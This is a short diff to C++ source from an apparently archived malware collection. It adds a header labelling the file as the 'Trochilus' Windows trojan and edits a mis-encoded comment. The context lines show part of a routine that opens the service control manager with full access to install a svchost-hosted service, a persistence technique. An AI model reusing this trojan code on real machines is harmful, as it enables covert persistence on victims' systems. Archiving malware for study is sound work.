@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     —
+ */
 #include "StdAfx.h"
 #include "peutils/peutils.h"
 #include "BinNames.h"
@@ -47,7 +58,7 @@ BOOL ServiceManager::InstallSvchostService(LPCTSTR serviceName, LPCTSTR displayN
 {
 	BOOL bSuccess = FALSE;
 	CODE_MARK_BEGIN();
-	//��ɱServiceMain
+	//��ɱServiceMain
 	std::wstring strServiceMainName = _T("Main");
 
 	SC_HANDLE sch = ::LOpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
